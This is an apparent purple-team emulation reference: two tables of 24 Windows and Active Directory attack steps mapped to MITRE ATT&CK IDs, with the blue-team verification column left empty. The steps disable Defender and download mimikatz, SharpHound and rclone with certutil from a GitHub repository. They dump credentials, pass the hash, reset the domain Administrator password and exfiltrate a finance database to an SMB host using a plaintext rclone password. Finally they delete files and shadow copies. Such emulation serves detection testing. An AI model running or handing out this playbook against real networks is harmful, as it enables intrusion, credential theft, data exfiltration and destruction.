# Red Team Emulation Reference

## Part 1

| Step | Action | ATT&CK Techniques | Blue Verification |
|--------|-------------------------------------------------------------------------|----------------|-----------------------------------------------------------|
|1 | `xfreerdp3 /u:PurpleUser /p:SecurePwd123 /v:10.0.1.15 /cert:ignore +clipboard` | T1021.001, T1078|
|2 | `whoami /all systeminfo` | T1033, T1082, T1059.001<br>(PowerShell T1059.001 will not be mentioned after that every time it is used)|
|3 | `quser` | T1033, T1082|
|4 | `net localgroup administrators`| T1069.001|
|5 | `Get-Process \| Select -Unique ProcessName` | T1057|
|6 | `Get-MpComputerStatus` | ? ||
|7 | `Set-MpPreference -DisableRealtimeMonitoring 1`<br>`Set-MpPreference -DisableBehaviorMonitoring 1`<br>`Set-MpPreference -DisableScriptScanning 1`<br>`Set-MpPreference -DisableBlockAtFirstSeen 1` | T1562.001|
|8 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe` | T1105|
|9 | `C:\temp\m.exe`<br>`privilege::debug`<br>`sekurlsa::logonpasswords` | T1003.001|
|10 | `[ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell` | T1550.002|
|11 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/SharpHound.exe C:\Temp\sh.exe` | T1105|
|12 | `C:\temp\sh.exe --memcache --zipfilename c.zip --outputdirectory C:\temp\` | T1087.001, T1087.002, T1560, T1059.001, T1482, T1615, T1106, T1201, T1069.001, T1069.002, T1018, T1033|
|13 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe` | T1105|
|14 | `[ss]`<br>`type = smb`<br>`host = 10.0.1.30`<br>`user = user`<br>`pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8` |?|
|15 | `C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Temp\<c.zip-filename> ss:data --no-check-dest` | T1048|

## Part 2

| Step | Action | ATT&CK Techniques | Blue Verification |
|--------|-------------------------------------------------------------------------|----------------|-----------------------------------------------------------|
|16 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/PowerShellActiveDirectory.dll C:\Temp\a.dll Import-Module C:\Temp\a.dll` | T1005|
|17 | `Add-ADGroupMember -Identity "ITSupport" -Members "billh"` | T1098.007|
|18 | `Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString 'DomainPwned!' -AsPlainText -Force) -Reset` | T1098|
|19 | `xfreerdp3 /u:Administrator /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert:ignore +clipboard` | T1021.001, T1078|
|20 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe` | T1105|
|21 | `[ss]`<br>`type = smb`<br>`host = 10.0.1.30`<br>`user = user`<br>`pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8` |?|
|22 | `Set-MpPreference -DisableRealtimeMonitoring 1` | T1562.001|
|23 | `C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Users\Administrator\Documents\finance.db ss:data --no-check-dest` | T1048|
|24 | `rm C:\Users\Administrator\Documents\finance.db`<br>`vssadmin.exe delete shadows /all` | T1490|
